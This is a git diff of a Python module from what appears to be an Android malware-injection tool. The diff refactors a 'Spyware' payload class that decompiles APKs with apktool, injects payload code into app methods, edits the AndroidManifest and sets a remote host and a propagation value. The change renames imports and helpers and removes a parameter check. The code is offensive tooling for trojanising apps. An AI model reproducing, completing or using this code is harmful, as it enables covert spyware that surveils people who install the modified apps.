@@ -18,9 +18,9 @@ import subprocess
 import time
 import zipfile
 
+from metadata import metadata
 from payloads.payload import Payload
-from utils import helper, metadata
-
+from utils import info, register, util
 
 class Spyware(Payload):
     def __init__(self, args):
@@ -29,9 +29,6 @@ class Spyware(Payload):
         self.propagate = self.args.propagate
 
     def run(self):
-
-        self.check_params()
-
         self.update_manifest()
         payload_path = self.copy_to_apk(self.target)
         self.set_rhost_ppg(payload_path)
@@ -41,25 +38,15 @@ class Spyware(Payload):
             self.inject_in_dir(d_metadata)
 
             # Displays result information
-            helper.get_dir_info(self, d_metadata)
+            util.get_dir_info(self, d_metadata)
 
         elif (os.path.isfile(self.target)):
             f_metadata = metadata.generate_f_metadata(self.target)
             self.inject(self.target, f_metadata)
 
             # Displays result information
-            helper.get_file_info(self, f_metadata)
+            util.get_file_info(self, f_metadata)
 
-    def check_params(self):
-        """
-        Validate command line arguments.
-        """
-        if not (self.rhost and self.propagate):
-            return False
-        elif not (os.path.exists(self.target)):
-            return False
-        else:
-            pass
 
     def inject(self, f_path, f_metadata):
         """
@@ -82,7 +69,7 @@ class Spyware(Payload):
                     words = line.split()
                     # Retrieving the method information from the meta-data
                     data = metadata.get_data(words[-1], f_metadata)
-                    valid_regs = helper.get_valid_regs(data[3], data[2])
+                    valid_regs = register.get_valid_regs(data[3], data[2])
                     # The method must have at least one free register, less
                     # than sixteen register, must not
                     # contain any monitor directive and not be alredy edited
@@ -134,12 +121,13 @@ class Spyware(Payload):
             for line in buffer:
                 file.write(line)
 
+    # Move it to payload and give as an argument the permissions to add
     def update_manifest(self):
         """
         Disassemble an app using apktool to extract, edit and recompile
         the AndroidManifest.
         """
-        cmd = "apktool d -f -s {0} -o {1}".format(self.app_path, os.path.join(
+        cmd = "apktool d -f -s {0} -o {1}".format(self.app, os.path.join(
             "tmp", self.app_name + "-res"))
         subprocess.call([cmd], shell=True, stdout=subprocess.DEVNULL,
                         stderr=subprocess.DEVNULL)
@@ -166,7 +154,7 @@ class Spyware(Payload):
             "tmp", self.app_name +
             "-res.apk")).extractall(os.path.join("tmp",
                                                  self.app_name + "-manif"))
-        helper.move_file(os.path.join(
+        util.move_file(os.path.join(
             "tmp", self.app_name + "-manif", "AndroidManifest.xml"),
             os.path.join("tmp", "AndroidManifest.xml"))
 
@@ -178,7 +166,7 @@ class Spyware(Payload):
 
     def set_rhost_ppg(self, d_path):
         """
-        Add the user inputed rhost and ppg to the AndroidManifest.
+        Add the rhost and ppg to the AndroidManifest.
         """
         files = os.listdir(d_path)
 
